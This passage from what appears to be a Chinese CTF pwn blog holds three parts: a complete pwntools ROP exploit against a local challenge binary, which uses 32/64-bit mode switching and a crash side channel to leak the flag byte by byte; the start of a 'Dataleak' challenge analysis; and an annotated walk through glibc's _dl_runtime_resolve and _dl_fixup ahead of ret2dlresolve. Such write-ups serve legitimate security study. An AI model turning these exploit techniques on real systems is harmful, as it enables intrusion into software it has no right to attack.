payload2+=p64(rbx_need)</span><br><span class="line">   payload2+=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload2+=p64(sub_rbx_0x41_bl_pop_rsi_pop_r15_pop_rbp_ret)</span><br><span class="line">   payload2+=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">   payload2+=p64(jne_ret)</span><br><span class="line">   payload2+=p64(pop_rax)</span><br><span class="line">   payload2+=p64(jmp_rax)</span><br><span class="line">   payload2+=p64(jmp_rax)</span><br></pre></td></tr></table></figure><p>最终exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.timeout=<span class="number">3</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./gadget&quot;</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> p, x        : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x        : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p           : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x        : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>   : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b     : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b    : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t        : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x        : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./gadget&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_offset=<span class="number">56</span></span><br><span class="line">retf = <span class="number">0x4011ed</span></span><br><span class="line">syscall=<span class="number">0x401165</span></span><br><span class="line">int_80=<span class="number">0x4011f3</span></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x401001</span></span><br><span class="line">pop_rdi_rbp = <span class="number">0x401734</span></span><br><span class="line">pop_rsi_r15_rbp = <span class="number">0x401732</span></span><br><span class="line">pop_rbx_pop_r12_pop_r14_pop_r15_pop_rbp = <span class="number">0x40172e</span></span><br><span class="line">pop_r12_pop_r14_pop_r15_pop_rbp = <span class="number">0x40172f</span> </span><br><span class="line">pop_rsp_pop_r14_pop_r15_pop_rbp = <span class="number">0x401730</span></span><br><span class="line">mov_rdx_r12_call_r14 = <span class="number">0x402c07</span></span><br><span class="line">pop_rcx = <span class="number">0x40117b</span></span><br><span class="line">jne_ret = <span class="number">0x408853</span></span><br><span class="line">sub_rbx_0x41_bl_pop_rsi_pop_r15_pop_rbp_ret = <span class="number">0x403f14</span></span><br><span class="line">jmp_rax = <span class="number">0X40107e</span></span><br><span class="line">ret = <span class="number">0x401002</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=(bss_addr &amp; <span class="number">0xfffffffffffff000</span>) + <span class="number">0xD00</span> <span class="comment">#open后read的起始位置</span></span><br><span class="line">flag_path=fake_stack-<span class="number">0x10</span> <span class="comment">#open所需要的字符串</span></span><br><span class="line">flag_addr_base=fake_stack - <span class="number">0x200</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">io,off,cha</span>):</span></span><br><span class="line">    <span class="comment">#success(&#x27;bss_addr: &#x27;+hex(bss_addr))</span></span><br><span class="line">    <span class="comment">#success(&#x27;fake_stack: &#x27;+hex(fake_stack))</span></span><br><span class="line">    <span class="comment">#gdb.attach(io,&#x27;b main&#x27;)</span></span><br><span class="line">    rbx_need=flag_addr_base+cha</span><br><span class="line">    read_flag_addr=rbx_need+<span class="number">0x41</span>-off</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;################################</span></span><br><span class="line"><span class="string">    调用read函数写flag路径 </span></span><br><span class="line"><span class="string">    ################################&#x27;&#x27;&#x27;</span></span><br><span class="line">    payload1 =<span class="string">b&#x27;a&#x27;</span>*stack_offset</span><br><span class="line">    payload1+=p64(pop_rax)</span><br><span class="line">    payload1+=p64(<span class="number">0</span>)</span><br><span class="line">    payload1+=p64(pop_rdi_rbp)</span><br><span class="line">    payload1+=p64(<span class="number">0</span>)</span><br><span class="line">    payload1+=p64(fake_stack)</span><br><span class="line">    payload1+=p64(pop_rsi_r15_rbp)</span><br><span class="line">    payload1+=p64(flag_path)</span><br><span class="line">    payload1+=p64(<span class="number">0</span>)</span><br><span class="line">    payload1+=p64(fake_stack)</span><br><span class="line">    payload1+=p64(pop_r12_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">    payload1+=p64(<span class="number">0x300</span>)</span><br><span class="line">    payload1+=p64(syscall)</span><br><span class="line">    payload1+=p64(<span class="number">0</span>)</span><br><span class="line">    payload1+=p64(fake_stack)</span><br><span class="line">    payload1+=p64(mov_rdx_r12_call_r14)</span><br><span class="line">    payload1+=p64(pop_rsp_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">    payload1+=p64(fake_stack)</span><br><span class="line">    sn(io,payload1)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;################</span></span><br><span class="line"><span class="string">    在32位下调用open函数</span></span><br><span class="line"><span class="string">    ################&#x27;&#x27;&#x27;</span></span><br><span class="line">    payload2 =<span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload2+=p64(syscall)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)</span><br><span class="line">    payload2+=p64(fake_stack)</span><br><span class="line">    payload2+=p64(pop_rcx)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)</span><br><span class="line">    payload2+=p64(pop_rbx_pop_r12_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">    payload2+=p64(flag_path)</span><br><span class="line">    payload2+=p64(<span class="number">0x300</span>)</span><br><span class="line">    payload2+=p64(syscall)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)</span><br><span class="line">    payload2+=p64(fake_stack)</span><br><span class="line">    payload2+=p64(pop_rax)</span><br><span class="line">    payload2+=p64(<span class="number">5</span>)</span><br><span class="line">    payload2+=p64(retf)</span><br><span class="line">    payload2+=p32(int_80)</span><br><span class="line">    payload2+=p32(<span class="number">0x23</span>)<span class="comment"># $cs=0x23</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;################################</span></span><br><span class="line"><span class="string">    返回64位调用read函数写flag到bss一区域</span></span><br><span class="line"><span class="string">    ################################&#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    payload2+=p32(retf)</span><br><span class="line">    payload2+=p32(pop_rdi_rbp)</span><br><span class="line">    payload2+=p32(<span class="number">0x33</span>)<span class="comment"># $cs=0x33</span></span><br><span class="line">    payload2+=p64(<span class="number">3</span>)</span><br><span class="line">    payload2+=p64(fake_stack)</span><br><span class="line">    payload2+=p64(pop_rsi_r15_rbp)</span><br><span class="line">    payload2+=p64(read_flag_addr)</span><br><span class="line">    </span><br><span class="line">    payload2+=p64(<span class="number">0</span>)</span><br><span class="line">    payload2+=p64(fake_stack)</span><br><span class="line">    payload2+=p64(pop_rax)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)</span><br><span class="line">    payload2+=p64(syscall)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;#################################</span></span><br><span class="line"><span class="string">    测信道攻击</span></span><br><span class="line"><span class="string">    #################################&#x27;&#x27;&#x27;</span></span><br><span class="line">    payload2+=p64(pop_rbx_pop_r12_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">    payload2+=p64(rbx_need)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">    payload2+=p64(sub_rbx_0x41_bl_pop_rsi_pop_r15_pop_rbp_ret)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">    payload2+=p64(jne_ret)</span><br><span class="line">    payload2+=p64(pop_rax)</span><br><span class="line">    payload2+=p64(jmp_rax)</span><br><span class="line">    payload2+=p64(jmp_rax)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sl(io,payload2)</span><br><span class="line">    io.recv()</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">        strl=<span class="string">&quot;现在是第&quot;</span>+<span class="built_in">str</span>(off)+<span class="string">&quot;位&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(strl)</span><br><span class="line">        <span class="keyword">for</span> cha <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">127</span>):</span><br><span class="line">            io=process(<span class="string">&#x27;./gadget&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                exp(io,off,cha)</span><br><span class="line">                flag=flag+<span class="built_in">chr</span>(cha)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>+flag)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">chr</span>(cha)==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                    pause()</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h2 id="Dataleak"><a href="#Dataleak" class="headerlink" title="Dataleak"></a>Dataleak</h2><p>我们可以看到这里的v6里储存的是我们想要的flag。我们只需要想办法将其泄露出来就好了。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220117135703799.png" alt="image-20220117135703799"></p><p>可以看到这里是有打印函数，但是打印的范围是小于v5的内存大小的，就算v5没有截止符，这里也是没办法泄露出flag的。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220117135836681.png" alt="image-20220117135836681"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220117135625231.png" alt="image-20220117135625231"></p><p>那么可能有问题的地方就在write之前调用的函数了</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220117144031745.png" alt="image-20220117144031745"></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> X86/x64pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于_dl_runtime_resolve分析与ret2dlresolve</title>
      <link href="/2021/08/13/%E5%85%B3%E4%BA%8E_dl_runtime_resolve%E5%88%86%E6%9E%90%E4%B8%8Eret2dlresolve/"/>
      <url>/2021/08/13/%E5%85%B3%E4%BA%8E_dl_runtime_resolve%E5%88%86%E6%9E%90%E4%B8%8Eret2dlresolve/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前总结了静态链接和动态链接的过程，这次我们要真正讨论一下ret2dl的攻击方法。在此之前我们需要把_dl_runtime_resolve进行一下分析。</p><h1 id="dl-runtime-resolve分析"><a href="#dl-runtime-resolve分析" class="headerlink" title="_dl_runtime_resolve分析"></a>_dl_runtime_resolve分析</h1><p>我在网上查到资料是这个函数在<em>\sysdeps\x86_64\dl-trampoline.S</em>路径里。但是里面没有找该函数的代码实现，我又看了看他的头文件，实际上的代码的实现是保存在<em>\sysdeps\x86_64\dl-trampoline.h</em>里。代码是用汇编实现的，</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="meta">.text</span></span><br><span class="line"><span class="meta">.globl</span> _dl_runtime_resolve</span><br><span class="line"><span class="meta">.hidden</span> _dl_runtime_resolve</span><br><span class="line"><span class="meta">.type</span> _dl_runtime_resolve, @function</span><br><span class="line"><span class="meta">.align</span> <span class="number">16</span></span><br><span class="line">cfi_startproc</span><br><span class="line"><span class="symbol">_dl_runtime_resolve:</span></span><br><span class="line">cfi_adjust_cfa_offset(<span class="number">16</span>) # Incorporate PLT</span><br><span class="line">#if DL_RUNIME_RESOLVE_REALIGN_STACK</span><br><span class="line"># if LOCAL_STORAGE_AREA != <span class="number">8</span></span><br><span class="line">#  error LOCAL_STORAGE_AREA must be <span class="number">8</span></span><br><span class="line"># endif</span><br><span class="line">pushq %rbx# <span class="keyword">push</span> subtracts stack by <span class="number">8</span>.</span><br><span class="line">cfi_adjust_cfa_offset(<span class="number">8</span>)</span><br><span class="line">cfi_rel_offset(%rbx, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">mov</span> %RSP_LP, %RBX_LP</span><br><span class="line">cfi_def_cfa_register(%rbx)</span><br><span class="line"><span class="keyword">and</span> $-VEC_SIZE, %RSP_LP</span><br><span class="line">#endif</span><br><span class="line"><span class="keyword">sub</span> $REGISTER_SAVE_AREA, %RSP_LP</span><br><span class="line">cfi_adjust_cfa_offset(REGISTER_SAVE_AREA)</span><br><span class="line"># Preserve registers otherwise clobbered.</span><br><span class="line"><span class="keyword">movq</span> %rax, REGISTER_SAVE_RAX(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %rcx, REGISTER_SAVE_RCX(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %rdx, REGISTER_SAVE_RDX(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %rsi, REGISTER_SAVE_RSI(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %rdi, REGISTER_SAVE_RDI(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %r8, REGISTER_SAVE_R8(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %r9, REGISTER_SAVE_R9(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">0</span>), (REGISTER_SAVE_VEC_OFF)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">1</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">2</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">2</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">3</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">3</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">4</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">4</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">5</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">5</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">6</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">6</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">7</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">7</span>)(%rsp)</span><br><span class="line">#ifndef __ILP32__</span><br><span class="line"># We also have to preserve <span class="keyword">bound</span> registers.  These are nops if</span><br><span class="line"># Intel MPX isn<span class="string">&#x27;t available or disabled.</span></span><br><span class="line"><span class="string"># ifdef HAVE_MPX_SUPPORT</span></span><br><span class="line"><span class="string">bndmov %bnd0, REGISTER_SAVE_BND0(%rsp)</span></span><br><span class="line"><span class="string">bndmov %bnd1, REGISTER_SAVE_BND1(%rsp)</span></span><br><span class="line"><span class="string">bndmov %bnd2, REGISTER_SAVE_BND2(%rsp)</span></span><br><span class="line"><span class="string">bndmov %bnd3, REGISTER_SAVE_BND3(%rsp)</span></span><br><span class="line"><span class="string"># else</span></span><br><span class="line"><span class="string">#  if REGISTER_SAVE_BND0 == 0</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x04,0x24</span></span><br><span class="line"><span class="string">#  else</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x44,0x24,REGISTER_SAVE_BND0</span></span><br><span class="line"><span class="string">#  endif</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x4c,0x24,REGISTER_SAVE_BND1</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x54,0x24,REGISTER_SAVE_BND2</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x5c,0x24,REGISTER_SAVE_BND3</span></span><br><span class="line"><span class="string"># endif</span></span><br><span class="line"><span class="string">#endif</span></span><br><span class="line"><span class="string"># Copy args pushed by PLT in register.</span></span><br><span class="line"><span class="string"># %rdi: link_map, %rsi: reloc_index</span></span><br><span class="line"><span class="string">mov (LOCAL_STORAGE_AREA + 8)(%BASE), %RSI_LP</span></span><br><span class="line"><span class="string">mov LOCAL_STORAGE_AREA(%BASE), %RDI_LP</span></span><br><span class="line"><span class="string">call _dl_fixup# Call resolver.</span></span><br><span class="line"><span class="string">mov %RAX_LP, %R11_LP# Save return value</span></span><br><span class="line"><span class="string">#ifndef __ILP32__</span></span><br><span class="line"><span class="string"># Restore bound registers.  These are nops if Intel MPX isn&#x27;</span>t</span><br><span class="line"># avaiable <span class="keyword">or</span> disabled.</span><br><span class="line"># ifdef HAVE_MPX_SUPPORT</span><br><span class="line"><span class="keyword">bndmov</span> REGISTER_SAVE_BND3(%rsp), %bnd3</span><br><span class="line"><span class="keyword">bndmov</span> REGISTER_SAVE_BND2(%rsp), %bnd2</span><br><span class="line"><span class="keyword">bndmov</span> REGISTER_SAVE_BND1(%rsp), %bnd1</span><br><span class="line"><span class="keyword">bndmov</span> REGISTER_SAVE_BND0(%rsp), %bnd0</span><br><span class="line"># else</span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x5c</span>,<span class="number">0x24</span>,REGISTER_SAVE_BND3</span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x54</span>,<span class="number">0x24</span>,REGISTER_SAVE_BND2</span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x4c</span>,<span class="number">0x24</span>,REGISTER_SAVE_BND1</span><br><span class="line">#  if REGISTER_SAVE_BND0 == <span class="number">0</span></span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x04</span>,<span class="number">0x24</span></span><br><span class="line">#  else</span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x44</span>,<span class="number">0x24</span>,REGISTER_SAVE_BND0</span><br><span class="line">#  endif</span><br><span class="line"># endif</span><br><span class="line">#endif</span><br><span class="line"># Get register content back.</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_R9(%rsp), %r9</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_R8(%rsp), %r8</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RDI(%rsp), %rdi</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RSI(%rsp), %rsi</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RDX(%rsp), %rdx</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RCX(%rsp), %rcx</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RAX(%rsp), %rax</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF)(%rsp), %VEC(<span class="number">0</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE)(%rsp), %VEC(<span class="number">1</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">2</span>)(%rsp), %VEC(<span class="number">2</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">3</span>)(%rsp), %VEC(<span class="number">3</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">4</span>)(%rsp), %VEC(<span class="number">4</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">5</span>)(%rsp), %VEC(<span class="number">5</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">6</span>)(%rsp), %VEC(<span class="number">6</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">7</span>)(%rsp), %VEC(<span class="number">7</span>)</span><br><span class="line">#if DL_RUNIME_RESOLVE_REALIGN_STACK</span><br><span class="line"><span class="keyword">mov</span> %RBX_LP, %RSP_LP</span><br><span class="line">cfi_def_cfa_register(%rsp)</span><br><span class="line"><span class="keyword">movq</span> (%rsp), %rbx</span><br><span class="line">cfi_restore(%rbx)</span><br><span class="line">#endif</span><br><span class="line"># Adjust stack(PLT did <span class="number">2</span> pushes)</span><br><span class="line"><span class="keyword">add</span> $(LOCAL_STORAGE_AREA + <span class="number">16</span>), %RSP_LP</span><br><span class="line">cfi_adjust_cfa_offset(-(LOCAL_STORAGE_AREA + <span class="number">16</span>))</span><br><span class="line"># Preserve <span class="keyword">bound</span> registers.</span><br><span class="line">PRESERVE_BND_REGS_PREFIX</span><br><span class="line"><span class="keyword">jmp</span> *%r11# Jump to function address.</span><br><span class="line">cfi_endproc</span><br><span class="line"><span class="meta">.size</span> _dl_runtime_resolve, .-_dl_runtime_resolve</span><br></pre></td></tr></table></figure><p>这段代码的功能就是保存寄存器的值到栈里,然后调用_dl_fixup执行具体功能，然后从栈中恢复寄存器。而调用_dl_fixup传入的参数rdi是link_map,rsi是GOT中关于PLT重定位的索引，后面根据该索引寻找要传入的新地址。所以分析_dl_fixup对我们了解_dl_runtime_resolve是非常重要的。</p><h2 id="dl-fixup分析"><a href="#dl-fixup分析" class="headerlink" title="_dl_fixup分析"></a>_dl_fixup分析</h2><p>_dl_fixup是定义和实现是在\elf\dl-runtime.c中，先来分析一下代码。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">   struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab</span></span><br><span class="line"><span class="function">    </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">    <span class="comment">//通过宏D_PTR获取获得动态链接符号表的地址，既得到.dynsym的指针。</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"><span class="comment">//通过宏D_PTR获取获得动态链接字符串的地址，既得到.dynstr的指针。</span></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc</span><br><span class="line">    = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">//reloc_offset就是传进来的第二个参数，GOT中关于PLT重定位的索引，将.rel.plt的地址与reloc_offset相加，得到该函数的ELF32_Rel的结构体指针。</span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">//得到r_info中里保存的重定位入口符号在符号表的下标，从而获取函数对应ELF32_sym的指针。</span></span><br><span class="line">  <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">    <span class="comment">//l-&gt;l_addr保存的是共享文件加载的基地址。这里的rel_addr是基地址l-&gt;l_addr加上got表在共享对象的偏移reloc-&gt;r_offset，得到我们要修改的got表所在的位置。</span></span><br><span class="line">  <span class="keyword">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"><span class="comment">//这里是检查r_info中的重定位入口类型是否是R_386_JMP_SLOT,动态链接中函数重定位一般都为R_386_JMP_SLOT，也就是7</span></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//这里判断函数是否被解析过，如果(sym-&gt;st_other)&amp;0x03结果为0，说明没有解析过，不属于STV_PROTECTED、STV_HIDDEN或者STV_INTERNAL其中任何一种。</span></span><br><span class="line">      <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="comment">//这部分获取version信息，我们可以发现version是使用我们的r_info进行赋值，如果我们r_info的重定位入口符号下标异常从而导致ndx数值异常，很可能导致l_versions[ndx]数组越界到不可读位置导致程序崩溃。</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment"> not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment"> we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">&#123;</span><br><span class="line">  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment"> of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment"> offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">  + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment"> address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, 